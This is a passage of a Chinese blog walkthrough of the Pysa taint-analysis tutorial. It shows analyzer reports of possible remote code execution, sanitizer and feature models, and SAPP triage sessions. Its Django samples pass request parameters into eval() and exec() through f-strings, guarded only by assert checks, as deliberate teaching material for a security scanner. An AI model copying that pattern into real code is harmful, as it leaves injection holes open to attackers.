class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">(tutorial) jck@analysis:~/pyre-check/documentation/pysa_tutorial/exercise2$ pyre analyze</span><br><span class="line">ƛ No cached overrides loaded, computing overrides...</span><br><span class="line">ƛ `google.protobuf.message.Message.ClearField` has 57 overrides, this might slow down the analysis considerably.</span><br><span class="line">ƛ `google.protobuf.message.Message.__init__` has 58 overrides, this might slow down the analysis considerably.</span><br><span class="line">ƛ `object.__eq__` has 82 overrides, this might slow down the analysis considerably.</span><br><span class="line">ƛ `object.__init__` has 754 overrides, this might slow down the analysis considerably.</span><br><span class="line">ƛ `object.__ne__` has 60 overrides, this might slow down the analysis considerably.</span><br><span class="line">ƛ `type.__call__` has 131 overrides, this might slow down the analysis considerably.</span><br><span class="line">ƛ `type.__init__` has 448 overrides, this might slow down the analysis considerably.</span><br><span class="line">ƛ `type.__new__` has 75 overrides, this might slow down the analysis considerably.</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;line&quot;</span>: 30,</span><br><span class="line">    <span class="string">&quot;column&quot;</span>: 34,</span><br><span class="line">    <span class="string">&quot;stop_line&quot;</span>: 30,</span><br><span class="line">    <span class="string">&quot;stop_column&quot;</span>: 56,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;views.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: 5002,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Possible RCE:&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5002]: User specified data may reach a shell execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;long_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5002]: User specified data may reach a shell execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;concise_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5002]: User specified data may reach a shell execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inference&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;define&quot;</span>: <span class="string">&quot;views.operate_on_fours&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;line&quot;</span>: 22,</span><br><span class="line">    <span class="string">&quot;column&quot;</span>: 9,</span><br><span class="line">    <span class="string">&quot;stop_line&quot;</span>: 22,</span><br><span class="line">    <span class="string">&quot;stop_column&quot;</span>: 35,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;views.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: 5001,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Possible RCE:&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5001]: User specified data may reach a code execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;long_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5001]: User specified data may reach a code execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;concise_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5001]: User specified data may reach a code execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inference&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;define&quot;</span>: <span class="string">&quot;views.operate_on_threes&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;line&quot;</span>: 14,</span><br><span class="line">    <span class="string">&quot;column&quot;</span>: 18,</span><br><span class="line">    <span class="string">&quot;stop_line&quot;</span>: 14,</span><br><span class="line">    <span class="string">&quot;stop_column&quot;</span>: 35,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;views.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: 5001,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Possible RCE:&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5001]: User specified data may reach a code execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;long_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5001]: User specified data may reach a code execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;concise_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5001]: User specified data may reach a code execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inference&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;define&quot;</span>: <span class="string">&quot;views.operate_on_twos&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="exercise3"><a href="#exercise3" class="headerlink" title="exercise3"></a>exercise3</h2><p>直接运行 <code>pyre analyze</code> 提示模型验证错误：<a href="https://github.com/facebook/pyre-check/issues/441">Found 93 model verification errors in exercise3 #441</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ƛ Finding taint models <span class="keyword">in</span> `/home/jck/pyre-check/stubs/taint, /home/jck/pyre-check/documentation/pysa_tutorial/exercise3`.ƛ Found 93 model verification errors!</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>添加 <code>--no-verify</code> 参数得到预期反馈，存在误报（假阳）问题。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">ƛ No cached overrides loaded, computing overrides...</span><br><span class="line">ƛ `google.protobuf.message.Message.ClearField` has 57 overrides, this might slow down the analysis considerably.</span><br><span class="line">ƛ `google.protobuf.message.Message.__init__` has 58 overrides, this might slow down the analysis considerably.</span><br><span class="line">ƛ Iteration <span class="comment">#2. 4 Callables [zipfile.ZipFile::__init__ (override), str::format (override), shelve.Shelf::__init__ (overri[</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;line&quot;</span>: 34,</span><br><span class="line">    <span class="string">&quot;column&quot;</span>: 9,</span><br><span class="line">    <span class="string">&quot;stop_line&quot;</span>: 34,</span><br><span class="line">    <span class="string">&quot;stop_column&quot;</span>: 35,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;views.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: 5001,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Possible shell injection&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;long_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;concise_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inference&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;define&quot;</span>: <span class="string">&quot;views.operate_on_threes&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;line&quot;</span>: 24,</span><br><span class="line">    <span class="string">&quot;column&quot;</span>: 18,</span><br><span class="line">    <span class="string">&quot;stop_line&quot;</span>: 24,</span><br><span class="line">    <span class="string">&quot;stop_column&quot;</span>: 35,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;views.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: 5001,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Possible shell injection&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;long_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;concise_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inference&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;define&quot;</span>: <span class="string">&quot;views.operate_on_twos&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>Pysa 为许多 Python 标准库和开源库提供了预先编写的源点、汇点和规则。预先写好的 <code>taint.config</code> 和 <code>*.pysa</code> 文件在 <a href="https://github.com/facebook/pyre-check/tree/master/stubs/taint"><code>stubs/taint</code></a> 文件夹中。</p><p>views.py 所有函数都没有安全问题，但执行 <code>pyre analyze --no-verify</code> 出现误报。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpRequest, HttpResponse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">example_sanitizer</span>():</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_operator_safe</span>(<span class="params">request: HttpRequest</span>) -&gt; str:</span></span><br><span class="line">    operator = request.POST[<span class="string">&quot;operator&quot;</span>]</span><br><span class="line">    <span class="keyword">assert</span> operator <span class="keyword">in</span> &#123;<span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;/&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> operator</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">operate_on_twos</span>(<span class="params">request: HttpRequest</span>) -&gt; HttpResponse:</span></span><br><span class="line">    operator = get_operator_safe(request)</span><br><span class="line">    result = <span class="built_in">eval</span>(<span class="string">f&quot;2 <span class="subst">&#123;operator&#125;</span> 2&quot;</span>)  <span class="comment"># noqa: P204</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">operate_on_threes</span>(<span class="params">request: HttpRequest</span>) -&gt; HttpResponse:</span></span><br><span class="line">    operator = request.GET[<span class="string">&quot;operator&quot;</span>]</span><br><span class="line">    <span class="keyword">assert</span> operator <span class="keyword">in</span> &#123;<span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;/&quot;</span>&#125;</span><br><span class="line">    exec(<span class="string">f&quot;result = 3 <span class="subst">&#123;operator&#125;</span> 3&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result  <span class="comment"># noqa: F821</span></span><br></pre></td></tr></table></figure><p>sanitizers.pysa 中定义了消毒器（Sanitizer），它们标记了 Pysa 对待整个可调用对象的方式变化，而不仅仅是返回值或参数，使用装饰器表示注释。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@Sanitize</span><br><span class="line">def views.example_sanitizer(): ...</span><br></pre></td></tr></table></figure><p>对于 <code>operate_on_twos</code> 函数，因为有调用 <code>get_operator_safe</code> 过滤请求，所以后续调用 <code>eval()</code> 也是安全的，将 <code>get_operator_safe</code> 标记为消毒器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@Sanitize</span><br><span class="line">def views.get_operator_safe(request: TaintSource[UserControlled]): ...</span><br></pre></td></tr></table></figure><p>再次执行 <code>pyre analyze --no-verify</code> 只剩一个误报：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">ƛ No cached overrides loaded, computing overrides...</span><br><span class="line">ƛ `google.protobuf.message.Message.ClearField` has 57 overrides, this might slow down the analysis considerably.</span><br><span class="line">ƛ `google.protobuf.message.Message.__init__` has 58 overrides, this might slow down the analysis considerably.</span><br><span class="line">ƛ Iteration <span class="comment">#2. 4 Callables [zipfile.ZipFile::__init__ (override), str::format (override), shelve.Shelf::__init__ (overri[</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;line&quot;</span>: 34,</span><br><span class="line">    <span class="string">&quot;column&quot;</span>: 9,</span><br><span class="line">    <span class="string">&quot;stop_line&quot;</span>: 34,</span><br><span class="line">    <span class="string">&quot;stop_column&quot;</span>: 35,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;views.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: 5001,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Possible shell injection&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;long_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;concise_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inference&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;define&quot;</span>: <span class="string">&quot;views.operate_on_threes&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><code>operate_on_threes</code> 函数本身就过滤了请求，这里添加一个 identity 函数调用，将参数原样返回。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">identity</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">operate_on_threes</span>(<span class="params">request: HttpRequest</span>) -&gt; HttpResponse:</span></span><br><span class="line">    operator = request.GET[<span class="string">&quot;operator&quot;</span>]</span><br><span class="line">    <span class="keyword">assert</span> operator <span class="keyword">in</span> &#123;<span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;/&quot;</span>&#125;</span><br><span class="line">    operator = identity(operator)</span><br><span class="line">    exec(<span class="string">f&quot;result = 3 <span class="subst">&#123;operator&#125;</span> 3&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result  <span class="comment"># noqa: F821</span></span><br></pre></td></tr></table></figure><p>将 identity 函数标记为消毒器，指明经过该消毒器的污点源就不再是污点数据，不用继续跟踪。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@Sanitize</span><br><span class="line">def views.identity(x: TaintSource[UserControlled]): ...</span><br></pre></td></tr></table></figure><p>再次执行 <code>pyre analyze --no-verify</code>，不存在误报了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">ƛ No cached overrides loaded, computing overrides...</span><br><span class="line">ƛ `google.protobuf.message.Message.ClearField` has 57 overrides, this might slow down the analysis considerably.</span><br><span class="line">ƛ `google.protobuf.message.Message.__init__` has 58 overrides, this might slow down the analysis considerably.</span><br><span class="line">ƛ Iteration <span class="comment">#2. 4 Callables [zipfile.ZipFile::__init__ (override), str::format (override), shelve.Shelf::__init__ (overri[]</span></span><br></pre></td></tr></table></figure><h2 id="exercise4"><a href="#exercise4" class="headerlink" title="exercise4"></a>exercise4</h2><p>使用 SAPP (Static Analysis Post Processor) 提供的交互式命令行。</p><p>views.py 函数同样不存在安全问题，但又产生了误报。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpRequest, HttpResponse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">example_feature</span>(<span class="params">argument: <span class="built_in">str</span></span>) -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">assert_numeric</span>(<span class="params">operand: <span class="built_in">str</span></span>) -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> operand.isnumeric()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_and</span>(<span class="params">request: HttpRequest</span>) -&gt; HttpResponse:</span></span><br><span class="line">    left = <span class="built_in">bool</span>(request.GET[<span class="string">&quot;left&quot;</span>])</span><br><span class="line">    right = <span class="built_in">bool</span>(request.GET[<span class="string">&quot;right&quot;</span>])</span><br><span class="line">    result = <span class="built_in">eval</span>(<span class="string">f&quot;<span class="subst">&#123;left&#125;</span> and <span class="subst">&#123;right&#125;</span>&quot;</span>)  <span class="comment"># noqa: P204</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_or</span>(<span class="params">request: HttpRequest</span>) -&gt; HttpResponse:</span></span><br><span class="line">    left = request.GET[<span class="string">&quot;left&quot;</span>]</span><br><span class="line">    right = request.GET[<span class="string">&quot;right&quot;</span>]</span><br><span class="line">    assert_numeric(left)</span><br><span class="line">    assert_numeric(right)</span><br><span class="line">    result = <span class="built_in">eval</span>(<span class="string">f&quot;<span class="subst">&#123;left&#125;</span> or <span class="subst">&#123;right&#125;</span>&quot;</span>)  <span class="comment"># noqa: P204</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>taint.config 特征（feature）是与污点流相关的附加元数据，可用于过滤误报（不影响分析）。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;sources&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;sinks&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;features&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;example&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;comment&quot;</span>: <span class="string">&quot;Copy this feature and write your own. Don&#x27;t forget that JSON lists are comma seperated!&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;rules&quot;</span>: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>features.pysa 使用了名称为 example 的特征。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def views.example_feature(argument: AddFeatureToArgument[Via[example]]): ...</span><br></pre></td></tr></table></figure><p>运行 Pysa 并在 SAPP 中打开结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pyre analyze --no-verify --save-results-to .</span><br><span class="line">sapp analyze taint-output.json</span><br><span class="line">sapp explore</span><br></pre></td></tr></table></figure><p>使用 SAPP 交互式命令行查看安全问题：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">[ run 1 ]</span><br><span class="line">&gt;&gt;&gt; issues <span class="comment"># 返回 2 个问题</span></span><br><span class="line">Issue 1</span><br><span class="line">            Code: 5001</span><br><span class="line">         Message: Data from [UserControlled] <span class="built_in">source</span>(s) may reach [RemoteCodeExecution] sink(s)</span><br><span class="line">        Callable: views.do_or</span><br><span class="line">         Sources: UserControlled</span><br><span class="line">           Sinks: RemoteCodeExecution</span><br><span class="line">        Features: first-index:right</span><br><span class="line">                  always-via:format-string</span><br><span class="line">                  has:first-index</span><br><span class="line">                  first-index:left</span><br><span class="line">        Location: views.py:33|18|38</span><br><span class="line">Min Trace Length: Source (0) | Sink (0)</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">Issue 2</span><br><span class="line">            Code: 5001</span><br><span class="line">         Message: Data from [UserControlled] <span class="built_in">source</span>(s) may reach [RemoteCodeExecution] sink(s)</span><br><span class="line">        Callable: views.do_and</span><br><span class="line">         Sources: UserControlled</span><br><span class="line">           Sinks: RemoteCodeExecution</span><br><span class="line">        Features: first-index:right</span><br><span class="line">                  always-type:bool</span><br><span class="line">                  always-type:scalar</span><br><span class="line">                  always-via:obscure</span><br><span class="line">                  always-via:format-string</span><br><span class="line">                  first-index:left</span><br><span class="line">                  has:first-index</span><br><span class="line">        Location: views.py:21|18|39</span><br><span class="line">Min Trace Length: Source (0) | Sink (0)</span><br><span class="line">Found 2 issues with run_id 1.</span><br><span class="line"></span><br><span class="line">[ run 1 ]</span><br><span class="line">&gt;&gt;&gt; issues(exclude_features=[<span class="string">&quot;always-type:bool&quot;</span>]) <span class="comment"># 过滤 do_and</span></span><br><span class="line">Issue 1</span><br><span class="line">            Code: 5001</span><br><span class="line">         Message: Data from [UserControlled] <span class="built_in">source</span>(s) may reach [RemoteCodeExecution] sink(s)</span><br><span class="line">        Callable: views.do_or</span><br><span class="line">         Sources: UserControlled</span><br><span class="line">           Sinks: RemoteCodeExecution</span><br><span class="line">        Features: first-index:right</span><br><span class="line">                  always-via:format-string</span><br><span class="line">                  has:first-index</span><br><span class="line">                  first-index:left</span><br><span class="line">        Location: views.py:33|18|38</span><br><span class="line">Min Trace Length: Source (0) | Sink (0)</span><br><span class="line">Found 1 issues with run_id 1.</span><br><span class="line"></span><br><span class="line">[ run 1 ]</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">exit</span> <span class="comment"># 退出</span></span><br><span class="line">(tutorial) jck@analysis:~/pyre-check/documentation/pysa_tutorial/exercise4$</span><br></pre></td></tr></table></figure><p>在 taint.config 中添加名称为 assert_numeric 的特征。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;sources&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;sinks&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;features&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;example&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;comment&quot;</span>: <span class="string">&quot;Copy this feature and write your own. Don&#x27;t forget that JSON lists are comma seperated!&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;assert_numeric&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;comment&quot;</span>: <span class="string">&quot;via assert_numeric&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;rules&quot;</span>: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 features.pysa 中使用该特征，指明 views.assert_numeric 函数的 operand 参数带有该特征。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def views.assert_numeric(operand: AddFeatureToArgument[Via[assert_numeric]]): ...</span><br></pre></td></tr></table></figure><p>重新运行 Pysa 并在 SAPP 中打开结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 